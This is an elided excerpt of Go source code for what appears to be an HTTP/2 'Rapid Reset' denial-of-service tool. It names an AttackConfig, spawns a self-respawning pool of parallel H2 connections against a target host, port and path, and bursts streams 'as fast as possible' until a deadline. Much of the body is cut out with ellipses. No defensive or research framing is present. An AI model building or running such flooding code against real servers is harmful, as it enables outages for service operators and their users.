...
func runRapidReset(cfg *AttackConfig) {
	...
	// Aggressive: many parallel connections
	...
	log.Printf("RapidReset: %d parallel H2 connections, target %s:%s%s", connCount, host, port, path)

	// Spawn connection pool with auto-respawn
...
func connectionWorker(id int, host, port, path string, deadline time.Time, wg *sync.WaitGroup) {
	...
	for time.Now().Before(deadline) {
		...
		if err != nil {
			...
			backoff := time.Duration(50*consecutiveFails) * time.Millisecond
...
func burstRapidReset(host, port, path string, deadline time.Time) error {
	...
	// Send SETTINGS with high stream limits
	if err := framer.WriteSettings(
		...
		http2.Setting{ID: http2.SettingMaxFrameSize, Val: 65536},
	...
	// AGGRESSIVE BURST: send streams as fast as possible
	streamID := uint32(1)
	...
	for time.Now().Before(deadline) && time.Now().Before(connDeadline) {
		...
		// Tiny pause every 100 streams to let drain catch up
